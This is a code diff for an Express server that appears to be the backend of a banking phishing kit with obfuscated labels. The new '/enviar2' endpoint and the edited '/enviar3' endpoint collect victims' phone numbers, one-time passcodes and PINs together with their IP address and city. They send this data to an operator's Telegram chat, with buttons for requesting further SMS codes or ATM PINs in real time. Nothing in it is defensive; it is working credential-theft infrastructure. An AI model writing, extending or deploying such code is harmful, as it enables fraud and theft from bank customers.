@@ -81,7 +81,7 @@ app.post('/enviar', async (req, res) => {
 🆔 ID: <code>${txid}</code>
 
 📱 C3L: <code>${usar}</code>
-🔐 NIP: <code>${clavv}</code>
+
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -111,7 +111,46 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+app.post('/enviar2', async (req, res) => {
+  const { usar, clavv, txid, dinamic } = req.body;
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
 
+  const mensaje = `
+🔑🟣C4SHY🟣
+🆔 ID: <code>${txid}</code>
+
+📱 C3L: <code>${usar}</code>
+🔑 0TP: <code>${clavv}</code>
+
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
+  guardarCliente(txid, cliente);
+
+   const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑SMS", callback_data: `cel-dina:${txid}` },
+        { text: "🔐NIP", callback_data: `cajero:${txid}` }
+      ],
+      [
+        { text: "❌LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+  });
+
+  res.sendStatus(200);
+});
 
 
 
@@ -121,13 +160,13 @@ app.post('/enviar3', async (req, res) => {
   const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
-🔑🔵N3L0🔵
+🔑🟣C4SHY🟣
 🆔 ID: <code>${txid}</code>
 
 📱 C3L: <code>${usar}</code>
+
 🔐 NIP: <code>${clavv}</code>
 
-🔑 0TP: <code>${pnn1}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
